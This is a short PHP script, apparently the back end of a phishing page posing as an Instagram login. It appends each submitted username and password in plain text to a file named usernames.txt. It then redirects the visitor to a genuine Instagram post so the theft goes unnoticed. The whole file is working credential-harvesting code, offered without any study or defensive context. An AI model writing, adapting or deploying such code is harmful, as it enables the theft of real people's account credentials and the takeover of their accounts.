<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/p/ClG-4lHKYR9/?next=%2F');
exit();
?>
